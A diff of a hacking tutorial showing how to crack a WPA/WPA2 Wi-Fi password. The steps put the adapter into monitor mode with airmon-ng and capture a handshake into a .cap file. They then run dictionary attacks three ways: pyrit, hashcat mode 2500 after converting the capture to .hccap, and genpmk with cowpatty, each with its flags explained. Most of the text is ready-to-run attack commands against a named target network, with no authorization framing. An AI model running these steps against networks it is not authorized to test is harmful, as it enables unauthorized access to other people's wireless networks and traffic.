@@ -1,9 +1,10 @@
 
 3 Ways to Crack Wifi using Pyrit, oclHashcat and Cowpatty
-posted inHacking Tools, Kali Linux, Penetration Testing, Wireless Hacking	on June 26, 2016 by Raj Chandel SHARE
 
 First start the monitor mode on our wireless adaptor .
---------------------------------------------------------airmon-ng start wlan0
+
+--------------------------------------------------------( airmon-ng start wlan0 )
+
 Now the monitor mode is enabled with name wlan0mon.
 
 and then with the following command start listening to all the available wifi connections:
@@ -24,3 +25,61 @@ Now we have to listen to a specific channel on which the target is present . Now
 Now wait till the WPA handshake is captured and then hit crtl^c.
 
 Now a file named sommay-01.cap will be generated
+
+
+[1] PYRIT
+First method to crack the password from the capture file is PYRIT . We will use dictionary-attack so run command:
+
+( pyrit -i /usr/share/nmap/nselib/data/password.lst -r sommay-01.cap attack_passthrough )
+
+-i == path to the input file in our case  it is the path to dictionary
+
+-r ==  path to the captured fle which in our case it is sommay-01.cap
+
+attack_passthrough == this options is to specify that a dictionary attack is to be performed
+
+As you can see it has successfully cracked the password.
+ 
+ 
+[2] OCLHASHCAT
+First of all download oclhashcat from its official website: https://hashcat.net/files/hashcat-2.00.7z
+
+First we have to convert the .cap file we captured with airodump-ng previously  to .hccap with aircrack-ng  by command:
+
+----------------------------------( aircrack-ng sommay-01.cap -J sommay-01 )
+
+-J == the path to the output file with extension .hccap
+
+Now copy the dictionary you want to use in the Hashcat folder. Now enter in the hashcat folder and run command:
+
+----------------------------------( ./hashcat-cli64.bin -m 2500 /root/sommay-01.hccap passwords.lst )
+
+In above command if you are using 32 bit system replace 64 with 32.
+
+-m is the hash type  which is 2500 for WPA/WPA2 cracking
+
+then give the path to .hccap file which you converted with aircrack-ng. and then the name of the dictionary file. As you can see it has successfully cracked the password
+
+[3] COWPATTY 
+For cracking with the help of cowpatty we have to first generate the hash file specific to the target AP. For this we will use genpmk so run command:
+
+----------------------------------( genpmk -f passwords.lst -d cowpatty_dict -s SOMMAY )
+
+-f == path to the dictionary file
+
+-d == name of the output dictionary
+
+-s == ESSID(Name) of the target AP(The name should be identical to the target AP)
+
+Now it will generate a dictionary file named cowpatty_dict which will speed up the cracking process.
+Now run command :
+
+----------------------------------( cowpatty  -d cowpatty_dict -r sommay-01.cap -s SOMMAY )
+
+-d == path to dictionary we generated with genpmk
+
+-r == path to the capture file we generated with airodump-ng
+
+-s == ESSID of the target AP(The name should be identical to the target AP)
+
+
